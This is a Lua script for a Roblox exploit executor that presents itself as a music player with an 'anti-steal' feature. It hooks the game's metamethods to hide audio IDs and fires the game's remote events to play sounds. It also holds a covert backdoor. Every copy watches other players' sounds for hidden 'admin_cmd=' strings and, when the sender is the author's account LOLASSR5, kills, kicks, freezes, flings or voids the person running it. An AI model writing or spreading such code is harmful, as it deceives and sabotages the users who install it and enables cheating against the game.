--[[
    ═══════════════════════════════════════════════════════════════════════
     MUSIC ONLY + ANTI-STEAL V27 (CUSTOM ADMIN: LOLASSR5)
     - Admin: LOLASSR5 (CORE)
     - รองรับการสั่งงานทั้งพิมพ์แชท (;) และกดปุ่มใน UI
     - ส่งคำสั่งผ่าน SoundId Carrier (แบบ KFC)
    ═══════════════════════════════════════════════════════════════════════
]]

local Players            = game:GetService("Players")
local TweenService       = game:GetService("TweenService")
local UserInputService   = game:GetService("UserInputService")
local RunService         = game:GetService("RunService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

local gethui = gethui or function() return game:GetService("CoreGui") end
local GuiParent = (function()
    local ok, r = pcall(gethui); if ok and r then return r end
    return LocalPlayer:WaitForChild("PlayerGui")
end)()

for _, n in ipairs({"MusicOnlyRoot","MusicOnlyToggle"}) do
    local old = GuiParent:FindFirstChild(n); if old then old:Destroy() end
end

------------------------------------------------------------------
-- CONFIG & ADMIN WHITELIST
------------------------------------------------------------------
local BAIT_ID_RAW      = "120232514292241"
local BAIT_NAME        = "กันเจาะกากๆรัน"
local ANTI_STEAL_ON    = true
local CURRENT_MODE     = "URI"
local SELECTED_DEVICE  = "Boombox"
local MUSIC_RESET_HOLD = 0.35
local MUSIC_RESET_ID   = "84899763517255"
local CHAT_PREFIX      = ";" -- เปลี่ยนเป็น ":" ได้ถ้าชอบแบบอื่น

-- ✅ อัปเดตชื่อแอดมินของคุณที่นี่แล้ว
local ADMIN_WHITELIST = {
    ["LOLASSR5"] = true, 
}

local function isAdmin()
    return ADMIN_WHITELIST[LocalPlayer.Name] == true
end

local DEVICES = {"Boombox","Skateboard","Hoverboard","PogoStick","Sled","CarrotPogoStick","PinkScooter","BlueScooter"}

------------------------------------------------------------------
-- ▓▓ METAMETHOD HOOK (หลอกสคริปต์อื่นไม่ให้เห็น ID จริง) ▓▓
------------------------------------------------------------------
local hookmetamethod = hookmetamethod
local checkcaller = checkcaller

if hookmetamethod and checkcaller then
    local oldIndex
    oldIndex = hookmetamethod(game, "__index", function(self, key)
        if key == "SoundId" and not checkcaller() then
            local success, isSound = pcall(function() return self:IsA("Sound") end)
            if success and isSound then
                if self.Name == "PlayersChoice" or self.Name == BAIT_NAME then
                    -- ถ้าเป็นตัวรับคำสั่งแอดมิน ให้แสดง Bait ID ปลอม
                    if tostring(oldIndex(self, key)):find("admin_cmd=") then
                        return "rbxassetid://" .. BAIT_ID_RAW
                    end
                    return "rbxassetid://" .. BAIT_ID_RAW
                end
            end
        end
        return oldIndex(self, key)
    end)
end

------------------------------------------------------------------
-- REMOTES & MUSIC ENGINE
------------------------------------------------------------------
local function findRemotes()
    local folder = ReplicatedStorage:FindFirstChild("RE") or ReplicatedStorage:FindFirstChild("RemoteEvents")
    if not folder then
        for _, v in ipairs(ReplicatedStorage:GetChildren()) do
            if v:IsA("Folder") and (v:FindFirstChild("PlayerToolEvent") or v:FindFirstChild("PlayerScooterEvent")) then
                folder = v; break
            end
        end
    end
    local t, s
    if folder then
        t = folder:FindFirstChild("PlayerToolEvent")
        s = folder:FindFirstChild("PlayerScooterEvent")
            or folder:FindFirstChild("1NoMoto1rVehicle1s")
            or folder:FindFirstChild("1NoMo1torVeh1icle1s")
    end
    return t, s
end
local ToolEvent, ScooterEvent = findRemotes()

local function buildAntiStealPayload(rawId, customCmd)
    local cleanId = tostring(rawId):match("%d+") or tostring(rawId)
    _G.MusicLastPlayedId = cleanId
    
    local parts = { "rbxassetid://" .. cleanId }
    
    -- ถ้ามีคำสั่งแอดมิน ให้ฝังไปกับ Payload
    if customCmd then
        parts[#parts+1] = "&admin_cmd=" .. customCmd
    else
        parts[#parts+1] = "&id=" .. BAIT_ID_RAW
        parts[#parts+1] = "&id=" .. BAIT_ID_RAW
    end
    return table.concat(parts)
end

local function cleanAudioId(v)
    local t = tostring(v or ""):match("^%s*(.-)%s*$") or ""
    return t:match("rbxassetid://(%d+)") or t:match("[?&]id=(%d+)")
        or t:match("library/(%d+)") or t:match("(%d+)") or ""
end

local function refreshRemotes() ToolEvent, ScooterEvent = findRemotes() end

local function flushServerReset()
    refreshRemotes()
    pcall(function()
        if ToolEvent then
            ToolEvent:FireServer("ToolMusicStop","",nil)
            ToolEvent:FireServer("ToolMusicText", MUSIC_RESET_ID)
            ToolEvent:FireServer("ToolMusic", MUSIC_RESET_ID, 1)
            ToolEvent:FireServer("ToolMusicPlay","",nil)
        end
    end)
    pcall(function()
        if ScooterEvent then
            ScooterEvent:FireServer("PickingScooterMusicStop","",nil)
            ScooterEvent:FireServer("PickingScooterMusicText", MUSIC_RESET_ID)
            ScooterEvent:FireServer("PickingScooterMusic", MUSIC_RESET_ID, 1)
        end
    end)
end

local function equipBoombox()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if not bp or not char then return nil end
    
    local tool = char:FindFirstChild("Boombox") or bp:FindFirstChild("Boombox")
    if not tool then
        for _, n in ipairs({"Super Boombox","BoomBox","Radio"}) do
            tool = char:FindFirstChild(n) or bp:FindFirstChild(n)
            if tool then break end
        end
    end

    if tool and tool.Parent == bp then pcall(function() tool.Parent = char end) end
    return tool
end

local function stopMusic()
    flushServerReset()
    if _G.MusicEnforceConn then
        pcall(function() _G.MusicEnforceConn:Disconnect() end)
        _G.MusicEnforceConn = nil
    end
    pcall(function()
        local char = LocalPlayer.Character
        if not char then return end
        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("Sound") and (d.Name == "PlayersChoice" or d.Name == BAIT_NAME) then
                d:Stop()
                d.SoundId = "" 
            end
        end
    end)
end

local function playMusic(audioId, isAdminCmd, cmdString)
    local cleaned = cleanAudioId(audioId)
    if cleaned == "" and not isAdminCmd then return false, "กรุณาใส่ Audio ID" end

    refreshRemotes()
    local useAnti = ANTI_STEAL_ON
    local payload = useAnti and buildAntiStealPayload(cleaned or BAIT_ID_RAW, cmdString) or cleaned

    -- ถือ Boombox
    local tool = equipBoombox()
    if not tool then return false, "ไม่พบ Boombox ในกระเป๋า" end
    task.wait(0.2)

    flushServerReset()
    task.wait(MUSIC_RESET_HOLD)

    pcall(function()
        if ToolEvent then
            ToolEvent:FireServer("ToolMusicText", payload, nil, true)
            ToolEvent:FireServer("ToolMusic", payload, 1)
            ToolEvent:FireServer("ToolMusicPlay", "", nil)
        end
    end)
    
    pcall(function()
        if ScooterEvent and (SELECTED_DEVICE ~= "Boombox") then
            ScooterEvent:FireServer("PickingScooterMusicText", payload, nil, true)
            ScooterEvent:FireServer("PickingScooterMusic", payload, 1)
            ScooterEvent:FireServer("PickingScooterMusicPlay", "", nil)
        end
    end)

    -- Enforce สำหรับเพลงปกติ (ไม่ทำตอนส่งแอดมิน)
    if not isAdminCmd then
        task.spawn(function()
            task.wait(0.3)
            if _G.MusicEnforceConn then pcall(function() _G.MusicEnforceConn:Disconnect() end) end
            _G.MusicEnforceConn = RunService.Heartbeat:Connect(function()
                if not ANTI_STEAL_ON then return end
                local char = LocalPlayer.Character
                if not char then return end
                for _, d in ipairs(char:GetDescendants()) do
                    if d:IsA("Sound") and (d.Name == "PlayersChoice" or d.Name == BAIT_NAME) then
                        pcall(function()
                            if d.Name ~= BAIT_NAME then d.Name = BAIT_NAME end
                            local currentId = rawget(d, "SoundId") or d.SoundId
                            if not currentId:find("admin_cmd=") and currentId ~= payload then
                                d.SoundId = "rbxassetid://" .. payload
                            end
                            d.Looped = true
                            if not d.IsPlaying then d:Play() end
                        end)
                    end
                end
            end)
        end)
    end

    return true, cleaned
end

------------------------------------------------------------------
-- ▓▓ ADMIN SYSTEM (ตัวรับคำสั่ง) ▓▓
------------------------------------------------------------------
local function parseAdminCommand(cmdString, senderName)
    if not ADMIN_WHITELIST[senderName] then return end -- ต้องเป็นแอดมินเท่านั้น
    
    local cmd, target = cmdString:match("^(%w+)_(.+)$")
    if not cmd or not target then return end
    
    local tNameLower = LocalPlayer.Name:lower()
    local tDispLower = LocalPlayer.DisplayName:lower()
    local targetLower = target:lower()
    
    -- เช็คชื่อเป้าหมาย (รองรับทั้ง Username, DisplayName และ all)
    if targetLower ~= tNameLower and targetLower ~= tDispLower and targetLower ~= "all" then return end
    
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    local hrp = char and char:FindFirstChild("HumanoidRootPart")

    if cmd == "KILL" then
        if hum then hum.Health = 0 end
    elseif cmd == "UNLOAD" then
        if GuiParent:FindFirstChild("MusicOnlyRoot") then GuiParent.MusicOnlyRoot:Destroy() end
        stopMusic()
    elseif cmd == "FREEZE" then
        if hum then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            if hrp then hrp.Anchored = true end
        end
    elseif cmd == "UNFREEZE" then
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            if hrp then hrp.Anchored = false end
        end
    elseif cmd == "FLING" then
        if hrp then
            hrp.AssemblyLinearVelocity = Vector3.new(1000, 1000, 1000)
            hrp.AssemblyAngularVelocity = Vector3.new(1000, 1000, 1000)
        end
    elseif cmd == "VOID" then
        if hrp then hrp.CFrame = CFrame.new(hrp.Position.X, -500, hrp.Position.Z) end
    elseif cmd == "BRING" then
        local admin = Players:FindFirstChild(senderName)
        if admin and admin.Character and admin.Character:FindFirstChild("HumanoidRootPart") and hrp then
            hrp.CFrame = admin.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
    elseif cmd == "KICK" then
        LocalPlayer:Kick("คุณถูกเตะโดยแอดมิน: " .. senderName)
    end
end

-- ตัวสแกนหาคำสั่ง (Scan หา SoundId ที่มี admin_cmd)
task.spawn(function()
    while true do
        task.wait(0.5)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character then
                for _, d in ipairs(p.Character:GetDescendants()) do
                    if d:IsA("Sound") and (d.Name == "PlayersChoice" or d.Name == BAIT_NAME) then
                        local rawSid = rawget(d, "SoundId") or d.SoundId
                        if type(rawSid) == "string" and rawSid:find("admin_cmd=") then
                            local cmdStr = rawSid:match("admin_cmd=([%w_%.]+)")
                            if cmdStr then
                                parseAdminCommand(cmdStr, p.Name)
                            end
                        end
                    end
                end
            end
        end
    end
end)

------------------------------------------------------------------
-- UI SYSTEM
------------------------------------------------------------------
local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
local function corner(p, r) local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0,r or 10); c.Parent = p; return c end
local function stroke(p, col, w) local s = Instance.new("UIStroke"); s.Color = col or Color3.fromRGB(255,255,255); s.Thickness = w or 1.2; s.Transparency = 0.35; s.Parent = p; return s end
local function pad(p,t,b,l,r) local u = Instance.new("UIPadding"); u.PaddingTop=UDim.new(0,t or 8); u.PaddingBottom=UDim.new(0,b or 8); u.PaddingLeft=UDim.new(0,l or 10); u.PaddingRight=UDim.new(0,r or 10); u.Parent=p; return u end

local Root = Instance.new("ScreenGui")
Root.Name = "MusicOnlyRoot"
Root.ResetOnSpawn = false
Root.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Root.Parent = GuiParent

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "MusicOnlyToggle"
ToggleBtn.Size = UDim2.new(0,52,0,52)
ToggleBtn.Position = UDim2.new(0,16,0.55,0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(20,20,28)
ToggleBtn.Text = "♪"
ToggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
ToggleBtn.TextSize = 22
ToggleBtn.Font = Enum.Font.GothamBold
ToggleBtn.AutoButtonColor = false
ToggleBtn.Parent = Root
corner(ToggleBtn, 14); stroke(ToggleBtn, Color3.fromRGB(255,80,200), 1.5)

local Win = Instance.new("Frame")
Win.Name = "Window"
Win.Size = UDim2.new(0, isMobile and 320 or 360, 0, isMobile and 500 or 540)
Win.Position = UDim2.new(0.5, -(isMobile and 160 or 180), 0.5, -(isMobile and 250 or 270))
Win.BackgroundColor3 = Color3.fromRGB(14,14,20); Win.BackgroundTransparency = 0.08; Win.Active = true; Win.Parent = Root
corner(Win, 16); stroke(Win, Color3.fromRGB(255,255,255), 1.2)

local WinGrad = Instance.new("UIGradient")
WinGrad.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255,60,120)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80,120,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40,255,180))})
WinGrad.Rotation = 45; WinGrad.Parent = Win

local WinInner = Instance.new("Frame")
WinInner.Size = UDim2.new(1,-2,1,-2); WinInner.Position = UDim2.new(0,1,0,1); WinInner.BackgroundColor3 = Color3.fromRGB(16,16,24); WinInner.BackgroundTransparency = 0.05; WinInner.Parent = Win
corner(WinInner, 15)

local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1,0,0,44); TitleBar.BackgroundColor3 = Color3.fromRGB(22,22,32); TitleBar.BackgroundTransparency = 0.2; TitleBar.Parent = WinInner
corner(TitleBar, 15)

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1,-50,1,0); TitleLabel.Position = UDim2.new(0,14,0,0); TitleLabel.BackgroundTransparency = 1; TitleLabel.Text = "♪  Music Only  ·  " .. BAIT_NAME
TitleLabel.TextColor3 = Color3.fromRGB(255,255,255); TitleLabel.TextSize = 15; TitleLabel.Font = Enum.Font.GothamBold; TitleLabel.TextXAlignment = Enum.TextXAlignment.Left; TitleLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0,32,0,32); CloseBtn.Position = UDim2.new(1,-38,0.5,-16); CloseBtn.BackgroundColor3 = Color3.fromRGB(40,20,28); CloseBtn.Text = "×"; CloseBtn.TextColor3 = Color3.fromRGB(255,120,140); CloseBtn.TextSize = 20; CloseBtn.Font = Enum.Font.GothamBold; CloseBtn.AutoButtonColor = false; CloseBtn.Parent = TitleBar
corner(CloseBtn, 8)

local Content = Instance.new("ScrollingFrame")
Content.Size = UDim2.new(1,-16,1,-56); Content.Position = UDim2.new(0,8,0,48); Content.BackgroundTransparency = 1; Content.ScrollBarThickness = 3; Content.ScrollBarImageColor3 = Color3.fromRGB(255,100,180); Content.CanvasSize = UDim2.new(0,0,0,800); Content.Parent = WinInner
local List = Instance.new("UIListLayout"); List.Padding = UDim.new(0,10); List.SortOrder = Enum.SortOrder.LayoutOrder; List.Parent = Content

local function makeSection(title, order)
    local f = Instance.new("Frame"); f.Size = UDim2.new(1,-4,0,0); f.AutomaticSize = Enum.AutomaticSize.Y; f.BackgroundColor3 = Color3.fromRGB(24,24,34); f.BackgroundTransparency = 0.15; f.LayoutOrder = order; f.Parent = Content
    corner(f, 12); stroke(f, Color3.fromRGB(255,255,255), 0.8); pad(f, 10, 12, 12, 12)
    local t = Instance.new("TextLabel"); t.Size = UDim2.new(1,0,0,20); t.BackgroundTransparency = 1; t.Text = title; t.TextColor3 = Color3.fromRGB(200,210,255); t.TextSize = 13; t.Font = Enum.Font.GothamBold; t.TextXAlignment = Enum.TextXAlignment.Left; t.Parent = f
    local inner = Instance.new("Frame"); inner.Size = UDim2.new(1,0,0,0); inner.Position = UDim2.new(0,0,0,26); inner.AutomaticSize = Enum.AutomaticSize.Y; inner.BackgroundTransparency = 1; inner.Parent = f
    local il = Instance.new("UIListLayout"); il.Padding = UDim.new(0,8); il.SortOrder = Enum.SortOrder.LayoutOrder; il.Parent = inner
    return inner
end

local function makeLabel(parent, txt, order)
    local l = Instance.new("TextLabel"); l.Size = UDim2.new(1,0,0,16); l.BackgroundTransparency = 1; l.Text = txt; l.TextColor3 = Color3.fromRGB(160,170,190); l.TextSize = 12; l.Font = Enum.Font.Gotham; l.TextXAlignment = Enum.TextXAlignment.Left; l.LayoutOrder = order; l.Parent = parent; return l
end

local function makeInput(parent, ph, order)
    local b = Instance.new("TextBox"); b.Size = UDim2.new(1,0,0,36); b.BackgroundColor3 = Color3.fromRGB(30,30,42); b.Text = ""; b.PlaceholderText = ph; b.PlaceholderColor3 = Color3.fromRGB(110,115,140); b.TextColor3 = Color3.fromRGB(240,240,255); b.TextSize = 13; b.Font = Enum.Font.Gotham; b.ClearTextOnFocus = false; b.LayoutOrder = order; b.Parent = parent
    corner(b, 9); stroke(b, Color3.fromRGB(120,100,255), 1); pad(b, 0, 0, 10, 10); return b
end

local function makeBtn(parent, txt, col, order)
    local b = Instance.new("TextButton"); b.Size = UDim2.new(1,0,0,38); b.BackgroundColor3 = col or Color3.fromRGB(80,60,200); b.Text = txt; b.TextColor3 = Color3.fromRGB(255,255,255); b.TextSize = 13; b.Font = Enum.Font.GothamBold; b.AutoButtonColor = false; b.LayoutOrder = order; b.Parent = parent
    corner(b, 10); stroke(b, Color3.fromRGB(255,255,255), 0.9)
    b.MouseButton1Down:Connect(function() TweenService:Create(b, TweenInfo.new(0.08), {BackgroundTransparency = 0.25}):Play() end)
    b.MouseButton1Up:Connect(function() TweenService:Create(b, TweenInfo.new(0.12), {BackgroundTransparency = 0}):Play() end)
    return b
end

local function makeToggle(parent, label, default, order, cb)
    local row = Instance.new("Frame"); row.Size = UDim2.new(1,0,0,32); row.BackgroundTransparency = 1; row.LayoutOrder = order; row.Parent = parent
    local t = Instance.new("TextLabel"); t.Size = UDim2.new(1,-56,1,0); t.BackgroundTransparency = 1; t.Text = label; t.TextColor3 = Color3.fromRGB(220,225,245); t.TextSize = 12; t.Font = Enum.Font.Gotham; t.TextXAlignment = Enum.TextXAlignment.Left; t.Parent = row
    local track = Instance.new("Frame"); track.Size = UDim2.new(0,46,0,24); track.Position = UDim2.new(1,-46,0.5,-12); track.BackgroundColor3 = default and Color3.fromRGB(60,200,140) or Color3.fromRGB(60,60,80); track.Parent = row; corner(track, 12)
    local knob = Instance.new("Frame"); knob.Size = UDim2.new(0,20,0,20); knob.Position = default and UDim2.new(1,-22,0.5,-10) or UDim2.new(0,2,0.5,-10); knob.BackgroundColor3 = Color3.fromRGB(255,255,255); knob.Parent = track; corner(knob, 10)
    local state = default
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1; btn.Text = ""; btn.Parent = row
    btn.MouseButton1Click:Connect(function()
        state = not state; TweenService:Create(track, TweenInfo.new(0.15), {BackgroundColor3 = state and Color3.fromRGB(60,200,140) or Color3.fromRGB(60,60,80)}):Play(); TweenService:Create(knob, TweenInfo.new(0.15), {Position = state and UDim2.new(1,-22,0.5,-10) or UDim2.new(0,2,0.5,-10)}):Play(); if cb then cb(state) end
    end); return row
end

local function makeDropdown(parent, opts, default, order, cb)
    local holder = Instance.new("Frame"); holder.Size = UDim2.new(1,0,0,36); holder.BackgroundTransparency = 1; holder.LayoutOrder = order; holder.Parent = parent; holder.ClipsDescendants = false
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,0,36); btn.BackgroundColor3 = Color3.fromRGB(30,30,42); btn.Text = "  " .. default .. "  ▼"; btn.TextColor3 = Color3.fromRGB(230,230,255); btn.TextSize = 12; btn.Font = Enum.Font.Gotham; btn.TextXAlignment = Enum.TextXAlignment.Left; btn.AutoButtonColor = false; btn.Parent = holder
    corner(btn, 9); stroke(btn, Color3.fromRGB(100,140,255), 1)
    local open = false; local listFrame
    btn.MouseButton1Click:Connect(function()
        if open and listFrame then listFrame:Destroy(); listFrame = nil; open = false; return end
        open = true; listFrame = Instance.new("Frame"); listFrame.Size = UDim2.new(1,0,0,math.min(#opts*32,160)); listFrame.Position = UDim2.new(0,0,0,38); listFrame.BackgroundColor3 = Color3.fromRGB(28,28,40); listFrame.ZIndex = 20; listFrame.Parent = holder
        corner(listFrame, 9); stroke(listFrame, Color3.fromRGB(120,100,255), 1)
        local sf = Instance.new("ScrollingFrame"); sf.Size = UDim2.new(1,0,1,0); sf.BackgroundTransparency = 1; sf.ScrollBarThickness = 3; sf.CanvasSize = UDim2.new(0,0,0,#opts*32); sf.ZIndex = 21; sf.Parent = listFrame
        local ll = Instance.new("UIListLayout"); ll.Parent = sf
        for _, opt in ipairs(opts) do
            local ob = Instance.new("TextButton"); ob.Size = UDim2.new(1,0,0,32); ob.BackgroundColor3 = Color3.fromRGB(28,28,40); ob.Text = "  " .. opt; ob.TextColor3 = Color3.fromRGB(220,225,255); ob.TextSize = 12; ob.Font = Enum.Font.Gotham; ob.TextXAlignment = Enum.TextXAlignment.Left; ob.ZIndex = 22; ob.AutoButtonColor = false; ob.Parent = sf
            ob.MouseButton1Click:Connect(function() btn.Text = "  " .. opt .. "  ▼"; if cb then cb(opt) end; listFrame:Destroy(); listFrame = nil; open = false end)
        end
    end); return holder
end

local function notify(msg, ok)
    local n = Instance.new("TextLabel"); n.Size = UDim2.new(0,280,0,36); n.Position = UDim2.new(0.5,-140,0,20); n.BackgroundColor3 = ok and Color3.fromRGB(30,80,60) or Color3.fromRGB(80,30,40); n.Text = msg; n.TextColor3 = Color3.fromRGB(255,255,255); n.TextSize = 12; n.Font = Enum.Font.GothamBold; n.ZIndex = 50; n.Parent = Root
    corner(n, 10); task.delay(2.2, function() if n then n:Destroy() end end)
end

------------------------------------------------------------------
-- BUILD UI
------------------------------------------------------------------
local secPlay = makeSection("ระบบควบคุมเพลง", 1)
makeLabel(secPlay, "รหัสเสียง (Audio ID)", 1)
local idBox = makeInput(secPlay, "ใส่ Audio ID หรือลิงก์...", 2)
makeLabel(secPlay, "อุปกรณ์ส่งสัญญาณเสียง", 3)
makeDropdown(secPlay, DEVICES, SELECTED_DEVICE, 4, function(v) SELECTED_DEVICE = v end)
makeToggle(secPlay, "กันเจาะกากๆรัน (Anti-Steal)", ANTI_STEAL_ON, 5, function(v) ANTI_STEAL_ON = v end)
makeLabel(secPlay, "โหมดกันดัก", 6)
makeDropdown(secPlay, {"URI", "DIGIT"}, CURRENT_MODE, 7, function(v) CURRENT_MODE = v end)

local playBtn = makeBtn(secPlay, "▶  เริ่มเล่นเพลง", Color3.fromRGB(60,160,100), 8)
local stopBtn = makeBtn(secPlay, "■  หยุดเพลง", Color3.fromRGB(160,50,70), 9)

playBtn.MouseButton1Click:Connect(function()
    notify("กำลังเตรียมอุปกรณ์...", true)
    local ok, msg = playMusic(idBox.Text)
    notify(ok and ("กำลังเล่น: " .. tostring(msg)) or tostring(msg), ok)
end)
stopBtn.MouseButton1Click:Connect(function() stopMusic(); notify("หยุดเพลงแล้ว", true) end)

-- ═══════════════════════════════════════════════════════════════
-- ▓▓ ADMIN PANEL UI & CHAT COMMANDS ▓▓
-- ═══════════════════════════════════════════════════════════════
if isAdmin() then
    -- 1. เพิ่มระบบ Chat Command
    LocalPlayer.Chatted:Connect(function(message)
        if string.sub(message, 1, #CHAT_PREFIX) == CHAT_PREFIX then
            local args = string.split(message, " ")
            local rawCmd = string.lower(args[1])
            local cmd = string.sub(rawCmd, #CHAT_PREFIX + 1) -- ตัดเครื่องหมาย ; ออก
            local target = args[2]
            
            if cmd and target then
                local validCmds = {kill=true, kick=true, freeze=true, unfreeze=true, bring=true, fling=true, void=true, unload=true}
                if validCmds[cmd] then
                    local finalCmd = string.upper(cmd) .. "_" .. target
                    playMusic(BAIT_ID_RAW, true, finalCmd) -- ส่งผ่านช่องเสียง
                    notify("Chat Cmd Sent: " .. finalCmd, true)
                else
                    notify("ไม่รู้จักคำสั่ง: " .. cmd, false)
                end
            else
                notify("รูปแบบผิด! พิมพ์: " .. CHAT_PREFIX .. "kill all", false)
            end
        end
    end)

    -- 2. สร้าง UI แผงแอดมิน
    local secAdmin = makeSection("แผงควบคุมแอดมิน (Admin Panel)", 3)
    
    makeLabel(secAdmin, "เลือกเป้าหมาย (พิมพ์ชื่อ หรือ 'all')", 1)
    local targetBox = makeInput(secAdmin, "ชื่อผู้เล่นเป้าหมาย...", 2)
    
    local function executeAdminCmd(cmd)
        local target = targetBox.Text
        if target == "" then notify("กรุณาใส่ชื่อเป้าหมาย", false); return end
        
        local finalCmd = cmd .. "_" .. target
        playMusic(BAIT_ID_RAW, true, finalCmd)
        notify("ส่งคำสั่ง " .. cmd .. " ไปที่ " .. target, true)
    end

    local btnRow1 = Instance.new("Frame"); btnRow1.Size = UDim2.new(1,0,0,38); btnRow1.BackgroundTransparency = 1; btnRow1.LayoutOrder = 3; btnRow1.Parent = secAdmin
    local layout1 = Instance.new("UIListLayout"); layout1.FillDirection = Enum.FillDirection.Horizontal; layout1.Padding = UDim.new(0,8); layout1.Parent = btnRow1
    
    local killBtn = makeBtn(btnRow1, "💀 Kill", Color3.fromRGB(200,50,50), 1); killBtn.Size = UDim2.new(0.48,0,1,0); killBtn.MouseButton1Click:Connect(function() executeAdminCmd("KILL") end)
    local kickBtn = makeBtn(btnRow1, "👢 Kick", Color3.fromRGB(200,50,50), 2); kickBtn.Size = UDim2.new(0.48,0,1,0); kickBtn.MouseButton1Click:Connect(function() executeAdminCmd("KICK") end)

    local btnRow2 = Instance.new("Frame"); btnRow2.Size = UDim2.new(1,0,0,38); btnRow2.BackgroundTransparency = 1; btnRow2.LayoutOrder = 4; btnRow2.Parent = secAdmin
    local layout2 = Instance.new("UIListLayout"); layout2.FillDirection = Enum.FillDirection.Horizontal; layout2.Padding = UDim.new(0,8); layout2.Parent = btnRow2

    local freezeBtn = makeBtn(btnRow2, "❄️ Freeze", Color3.fromRGB(50,150,255), 1); freezeBtn.Size = UDim2.new(0.48,0,1,0); freezeBtn.MouseButton1Click:Connect(function() executeAdminCmd("FREEZE") end)
    local unfreezeBtn = makeBtn(btnRow2, "🔥 Unfreeze", Color3.fromRGB(50,150,255), 2); unfreezeBtn.Size = UDim2.new(0.48,0,1,0); unfreezeBtn.MouseButton1Click:Connect(function() executeAdminCmd("UNFREEZE") end)

    local btnRow3 = Instance.new("Frame"); btnRow3.Size = UDim2.new(1,0,0,38); btnRow3.BackgroundTransparency = 1; btnRow3.LayoutOrder = 5; btnRow3.Parent = secAdmin
    local layout3 = Instance.new("UIListLayout"); layout3.FillDirection = Enum.FillDirection.Horizontal; layout3.Padding = UDim.new(0,8); layout3.Parent = btnRow3

    local bringBtn = makeBtn(btnRow3, "🪄 Bring", Color3.fromRGB(150,50,200), 1); bringBtn.Size = UDim2.new(0.48,0,1,0); bringBtn.MouseButton1Click:Connect(function() executeAdminCmd("BRING") end)
    local flingBtn = makeBtn(btnRow3, "🚀 Fling", Color3.fromRGB(150,50,200), 2); flingBtn.Size = UDim2.new(0.48,0,1,0); flingBtn.MouseButton1Click:Connect(function() executeAdminCmd("FLING") end)

    local btnRow4 = Instance.new("Frame"); btnRow4.Size = UDim2.new(1,0,0,38); btnRow4.BackgroundTransparency = 1; btnRow4.LayoutOrder = 6; btnRow4.Parent = secAdmin
    local layout4 = Instance.new("UIListLayout"); layout4.FillDirection = Enum.FillDirection.Horizontal; layout4.Padding = UDim.new(0,8); layout4.Parent = btnRow4

    local voidBtn = makeBtn(btnRow4, "🕳️ Void", Color3.fromRGB(80,80,80), 1); voidBtn.Size = UDim2.new(0.48,0,1,0); voidBtn.MouseButton1Click:Connect(function() executeAdminCmd("VOID") end)
    local unloadBtn = makeBtn(btnRow4, "🗑️ Unload", Color3.fromRGB(80,80,80), 2); unloadBtn.Size = UDim2.new(0.48,0,1,0); unloadBtn.MouseButton1Click:Connect(function() executeAdminCmd("UNLOAD") end)

else
    local secInfo = makeSection("สถานะ", 3)
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1,0,0,40); statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Bait: " .. BAIT_NAME .. "\nโหมด: " .. CURRENT_MODE
    statusLabel.TextColor3 = Color3.fromRGB(170,180,210); statusLabel.TextSize = 11
    statusLabel.Font = Enum.Font.Gotham; statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
    statusLabel.LayoutOrder = 1; statusLabel.Parent = secInfo
end

------------------------------------------------------------------
-- DRAG SYSTEM
------------------------------------------------------------------
local dragging, dragStart, startPos
local function beginDrag(input) dragging=true; dragStart=input.Position; startPos=Win.Position
    input.Changed:Connect(function() if input.UserInputState==Enum.UserInputState.End then dragging=false end end)
end
local function updateDrag(input)
    if not dragging then return end
    local d = input.Position - dragStart
    Win.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
end
TitleBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then beginDrag(i) end
end)
UserInputService.InputChanged:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then updateDrag(i) end
end)

local visible = true
ToggleBtn.MouseButton1Click:Connect(function() visible = not visible; Win.Visible = visible end)
CloseBtn.MouseButton1Click:Connect(function() Win.Visible = false end)

do
    local tDrag, tStart, tPos
    ToggleBtn.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.Touch or i.UserInputType == Enum.UserInputType.MouseButton1 then
            tDrag = true; tStart = i.Position; tPos = ToggleBtn.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if not tDrag then return end
        if i.UserInputType == Enum.UserInputType.Touch or i.UserInputType == Enum.UserInputType.MouseMovement then
            local d = i.Position - tStart
            if d.Magnitude > 8 then
                ToggleBtn.Position = UDim2.new(tPos.X.Scale, tPos.X.Offset+d.X, tPos.Y.Scale, tPos.Y.Offset+d.Y)
            end
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.Touch or i.UserInputType == Enum.UserInputType.MouseButton1 then tDrag = false end
    end)
end

print("[Music Only V27] Loaded · Admin: LOLASSR5 (CORE) · Chat Commands Active")